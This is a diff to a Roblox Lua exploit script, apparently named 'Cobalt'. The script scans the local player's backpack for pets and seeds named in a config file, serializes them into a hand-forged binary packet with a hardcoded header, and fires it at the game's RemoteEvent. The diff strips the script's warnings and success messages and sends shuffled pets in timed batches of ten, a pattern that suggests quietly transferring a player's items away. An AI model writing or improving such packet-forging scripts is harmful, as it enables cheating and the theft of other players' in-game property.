@@ -4,62 +4,44 @@ return function(config)
     local player = Players.LocalPlayer
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-    -- Use dynamic lists from config
+    -- Use the lists from the config (yo.txt)
     local petSet = {}
     for _, name in ipairs(config.pets or {}) do petSet[name:lower()] = true end
-
     local seedSet = {}
     for _, name in ipairs(config.seeds or {}) do seedSet[name:lower()] = true end
 
-    -- ==========================================
-    -- SCAN BACKPACK
-    -- ==========================================
     local backpack = player:WaitForChild("Backpack", 5)
-    if not backpack then
-        warn("Cobalt: Backpack folder not found.")
-        return
-    end
+    if not backpack then return end
 
-    local scannedItems = {}
+    local seedItems = {}
+    local petItems = {}
     for _, item in ipairs(backpack:GetChildren()) do
         local mainCategory = item:GetAttribute("MainCategory")
-        
         if mainCategory == "Seed" then
             local seedTool = item:GetAttribute("SeedTool")
             if seedTool and seedSet[seedTool:lower()] then
-                table.insert(scannedItems, {itemKey = seedTool, count = item:GetAttribute("Count") or 1, category = "Seeds"})
+                table.insert(seedItems, {itemKey = seedTool, count = item:GetAttribute("Count") or 1, category = "Seeds"})
             end
         else
             local petName = item:GetAttribute("Pet")
             local petId = item:GetAttribute("PetId")
             if petName and petSet[petName:lower()] then
-                table.insert(scannedItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
+                table.insert(petItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
             end
         end
     end
 
-    if #scannedItems == 0 then
-        warn("Cobalt: No matching seeds or pets found.")
-        return
-    end
+    -- Shuffle pets
+    for i = #petItems, 2, -1 do local j = math.random(i); petItems[i], petItems[j] = petItems[j], petItems[i] end
 
-    -- ==========================================
-    -- SERIALIZATION
-    -- ==========================================
+    -- SERIALIZATION & FIRE LOGIC
     local function smartEscape(str)
         local escaped = ""
         for i = 1, #str do
             local char = str:sub(i, i)
             local byteVal = string.byte(char)
-            if char == "\\" then escaped = escaped .. "\\\\"
-            elseif char == "\"" then escaped = escaped .. "\\\""
+            if char == "\\" then escaped = escaped .. "\\\\" elseif char == "\"" then escaped = escaped .. "\\\""
             elseif byteVal >= 32 and byteVal <= 126 then escaped = escaped .. char
-            elseif char == "\t" then escaped = escaped .. "\\t"
-            elseif char == "\n" then escaped = escaped .. "\\n"
-            elseif char == "\r" then escaped = escaped .. "\\r"
-            elseif char == "\v" then escaped = escaped .. "\\v"
-            elseif char == "\a" then escaped = escaped .. "\\a"
-            elseif char == "\b" then escaped = escaped .. "\\b"
             else escaped = escaped .. string.format("\\x%02X", byteVal) end
         end
         return escaped
@@ -77,33 +59,39 @@ return function(config)
         return "\\x05" .. numByte
     end
 
-    local finalBufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
-    for index, item in ipairs(scannedItems) do
-        local indexByte = string.format("\\x%02X", index)
-        if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
-        finalBufferString = finalBufferString .. indexByte .. "\\x1C"
-        finalBufferString = finalBufferString .. encodeString("ItemKey") .. encodeString(item.itemKey)
-        finalBufferString = finalBufferString .. encodeString("Count") .. encodeNumber(item.count)
-        finalBufferString = finalBufferString .. encodeString("Category") .. encodeString(item.category)
-        finalBufferString = finalBufferString .. "\\x00"
-        if index < #scannedItems then finalBufferString = finalBufferString .. "\\x05" end
+    local function buildPayloadString(itemList)
+        if #itemList == 0 then return nil end
+        local bufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
+        for index, item in ipairs(itemList) do
+            local indexByte = string.format("\\x%02X", index)
+            if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
+            bufferString = bufferString .. indexByte .. "\\x1C" .. encodeString("ItemKey") .. encodeString(item.itemKey) .. encodeString("Count") .. encodeNumber(item.count) .. encodeString("Category") .. encodeString(item.category) .. "\\x00"
+            if index < #itemList then bufferString = bufferString .. "\\x05" end
+        end
+        return bufferString .. "\\x00\\x00"
     end
-    finalBufferString = finalBufferString .. "\\x00\\x00"
 
-    -- ==========================================
-    -- FIRE
-    -- ==========================================
-    local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules")
-        and ReplicatedStorage.SharedModules:FindFirstChild("Packet")
-        and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")
+    local function firePayloadString(payloadStr)
+        local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules") and ReplicatedStorage.SharedModules:FindFirstChild("Packet") and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")
+        if packetEvent then
+            local binaryStr = payloadStr:gsub("\\x(%x%x)", function(hex) return string.char(tonumber(hex, 16)) end):gsub("\\v", "\v"):gsub("\\a", "\a"):gsub("\\\\", "\\"):gsub('\\"', '"')
+            packetEvent:FireServer(buffer.fromstring(binaryStr))
+            return true
+        end
+        return false
+    end
 
-    if packetEvent then
-        local binaryStr = finalBufferString:gsub("\\x(%x%x)", function(hex) return string.char(tonumber(hex, 16)) end)
-            :gsub("\\v", "\v"):gsub("\\a", "\a"):gsub("\\t", "\t"):gsub("\\n", "\n"):gsub("\\r", "\r"):gsub("\\b", "\b"):gsub("\\\\", "\\"):gsub('\\"', '"')
-        local payloadBuffer = buffer.fromstring(binaryStr)
-        packetEvent:FireServer(payloadBuffer)
-        print("Cobalt: Payload fired successfully!")
-    else
-        warn("Cobalt: RemoteEvent not found.")
+    -- Process Batches
+    local petIndex = 1
+    local totalPets = #petItems
+    local firstBatch = {}
+    for _, s in ipairs(seedItems) do table.insert(firstBatch, s) end
+    for i = 1, math.min(10, totalPets) do table.insert(firstBatch, petItems[petIndex]); petIndex = petIndex + 1 end
+    
+    if #firstBatch > 0 then firePayloadString(buildPayloadString(firstBatch)); task.wait(12) end
+    while petIndex <= totalPets do
+        local chunk = {}
+        for i = 1, math.min(10, totalPets - petIndex + 1) do table.insert(chunk, petItems[petIndex]); petIndex = petIndex + 1 end
+        firePayloadString(buildPayloadString(chunk)); task.wait(12)
     end
 end
